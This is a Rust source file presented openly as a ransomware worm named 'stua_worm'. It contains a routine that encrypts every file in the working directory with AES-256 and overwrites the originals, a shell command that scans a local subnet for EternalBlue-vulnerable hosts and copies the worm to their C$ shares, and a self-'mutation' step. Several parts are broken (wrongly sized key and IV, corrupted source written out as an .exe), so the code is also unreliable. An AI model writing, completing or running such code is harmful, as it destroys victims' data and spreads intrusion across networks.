use std::process::Command;
use std::fs::{self, File};
use std::io::{Read, Write};
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use rand::Rng;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

// Polymorphic Engine: Mutates code on each infection
fn mutate_code() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut code = include_bytes!("stua_worm.rs").to_vec();
    for _ in 0..10 {
        let pos = rng.gen_range(0..code.len());
        code[pos] = rng.gen();
    }
    code
}

// Ransomware Payload: Encrypts files with AES-256
fn encrypt_files(key: &[u8], iv: &[u8]) {
    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
    for entry in fs::read_dir(".").unwrap() {
        let path = entry.unwrap().path();
        if path.is_file() {
            let mut file = File::open(&path).unwrap();
            let mut data = Vec::new();
            file.read_to_end(&mut data).unwrap();
            let ciphertext = cipher.encrypt_vec(&data);
            let mut encrypted_file = File::create(path).unwrap();
            encrypted_file.write_all(&ciphertext).unwrap();
        }
    }
}

// Network Propagation: Exploits SMB (EternalBlue)
fn propagate() {
    Command::new("sh")
        .arg("-c")
        .arg("nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24 | grep vulnerable | awk '{print $5}' | xargs -I {} smbclient //{}/C$ -N -c 'put stua_worm.exe'")
        .output()
        .expect("Failed to propagate");
}

fn main() {
    let key = b"STUA_OMEGA9_32BYTE_ENCRYPTION_KEY_1234567890"; // Replace with dynamic key
    let iv = b"STUA_16BYTE_IV_1234";
    let mutated_code = mutate_code();
    File::create("stua_worm.exe").unwrap().write_all(&mutated_code).unwrap();
    encrypt_files(key, iv);
    propagate();
}